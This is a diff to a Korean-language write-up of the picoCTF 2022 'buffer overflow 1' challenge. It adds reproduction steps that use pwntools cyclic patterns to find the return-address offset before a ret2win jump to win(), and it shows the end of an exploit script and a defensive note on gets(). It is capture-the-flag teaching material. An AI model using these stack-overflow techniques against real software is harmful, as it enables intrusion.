@@ -1,7 +1,7 @@
 ---
 title: buffer overflow 1 — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, stack-overflow, ret2win, saved-return-address, picoctf]
 sources: [https://colej.net/picoctf-2022-buffer-overflow-1, https://medium.com/@muranyi.levente/picoctf-2022-buffer-overflow-1-3e48f4a61876, https://ctftime.org/writeup/32919]
@@ -70,6 +70,26 @@ io.sendlineafter(b':', payload)  # 입력을 보냅니다.
 io.interactive()                 # flag 출력 후 확인합니다.
 ```
 
+
+## 재현 절차
+
+1. 오프셋을 찾습니다.
+```bash
+# cyclic 패턴으로 saved return address 덮어쓰기 위치를 찾습니다.
+python3 - <<'PY'            # 예상: 200바이트 cyclic 문자열 출력
+from pwn import cyclic
+print(cyclic(200).decode())
+PY
+```
+2. 크래시 값으로 `cyclic_find`를 수행합니다.
+```bash
+# EIP 값을 이용해 오프셋을 역산합니다.
+python3 - <<'PY'            # 예상: 정수 오프셋이 출력됩니다.
+from pwn import cyclic_find
+print(cyclic_find(0x6161616c))  # 예시 EIP 값입니다.
+PY
+```
+3. `win()` 주소로 ret2win을 수행합니다.
 ## 6. 방어 관점 메모
 
 - `gets()`는 사용하면 안 됩니다.
